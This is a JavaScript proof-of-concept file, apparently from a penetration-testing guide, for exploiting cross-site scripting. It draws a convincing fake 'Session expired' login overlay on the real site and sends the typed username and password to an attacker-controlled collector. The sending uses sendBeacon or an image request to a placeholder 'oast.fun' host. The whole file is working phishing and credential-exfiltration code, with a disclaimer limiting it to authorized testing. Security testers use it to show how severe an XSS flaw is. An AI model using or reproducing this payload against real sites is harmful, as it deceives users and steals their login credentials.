/*
 * phish_overlay.js — In-origin credential-harvest overlay PoC (guide §28).
 * When you can't directly steal a session/token (e.g. CSP blocks exfil but allows DOM writes),
 * use the execution to render a convincing "re-authenticate" prompt ON THE REAL ORIGIN. The
 * authentic URL bar makes this far more credible than a look-alike domain.
 *
 * AUTHORIZED TESTING ONLY. For a PoC, capture ONLY your own test credentials to your own
 * collector. Do NOT phish real users. This demonstrates that reflected/stored XSS enables
 * realistic credential theft, raising severity (guide §36/§37).
 */
(function () {
  var COLLECTOR = "//YOUR.oast.fun/p";

  var host = location.hostname;
  var html =
    '<div id="x-ov" style="position:fixed;inset:0;background:#fff;z-index:2147483647;font-family:system-ui,Arial,sans-serif">' +
      '<div style="max-width:360px;margin:12vh auto;padding:28px;border:1px solid #ddd;border-radius:10px;box-shadow:0 8px 30px rgba(0,0,0,.1)">' +
        '<h2 style="margin:0 0 6px">Session expired</h2>' +
        '<p style="color:#555;margin:0 0 18px">Please sign in again to continue on <b>' + host + '</b>.</p>' +
        '<form id="x-f">' +
          '<input name="username" placeholder="Email" autocomplete="username" style="width:100%;padding:10px;margin:6px 0;box-sizing:border-box">' +
          '<input name="password" type="password" placeholder="Password" autocomplete="current-password" style="width:100%;padding:10px;margin:6px 0;box-sizing:border-box">' +
          '<button style="width:100%;padding:11px;margin-top:10px;border:0;border-radius:6px;background:#2563eb;color:#fff;font-weight:600">Sign in</button>' +
        '</form>' +
      '</div>' +
    '</div>';

  var wrap = document.createElement("div");
  wrap.innerHTML = html;
  document.body.appendChild(wrap);

  document.getElementById("x-f").addEventListener("submit", function (e) {
    e.preventDefault();
    var fd = new FormData(e.target);
    var data = { u: fd.get("username"), p: fd.get("password"), origin: location.origin };
    try {
      navigator.sendBeacon(COLLECTOR, JSON.stringify(data));
    } catch (err) {
      new Image().src = COLLECTOR + "?d=" + encodeURIComponent(JSON.stringify(data));
    }
    // Dismiss the overlay so the PoC is non-disruptive.
    var ov = document.getElementById("x-ov");
    if (ov) ov.remove();
  });
})();
